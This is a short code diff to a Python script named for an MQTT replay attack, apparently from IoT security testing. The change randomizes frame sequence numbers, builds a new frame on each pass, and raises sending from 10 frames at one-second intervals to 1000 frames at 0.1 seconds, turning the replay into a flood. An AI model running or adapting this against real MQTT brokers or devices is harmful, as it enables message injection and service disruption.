@@ -26,7 +26,7 @@ def compute_mac(counter, private_key):
 def create_data_frame():
     preamble = 0xAA55  
     identifier_id = 0x8110910 
-    sequence_number = 0x01
+    sequence_number = random.randint(0, 65535)
     packet_type = 0x01
     nonce = random.getrandbits(128) 
     payload = b'A' * 20  
@@ -70,13 +70,12 @@ def replay_attack_mqtt():
         print(f"Failed to connect to MQTT Broker: {e}")
         return 
 
-    data_frame = create_data_frame()
-
     #replay the data frame 10 times
-    for i in range (0, 10):
+    for i in range (0, 1000):
         print("Replaying the captured Data Frame...")
+        data_frame = create_data_frame()
         send_data_frame_mqtt(data_frame, client)
-        time.sleep(1)
+        time.sleep(0.1)
     
     client.disconnect()
     print("Disconnected from MQTT Broker.")
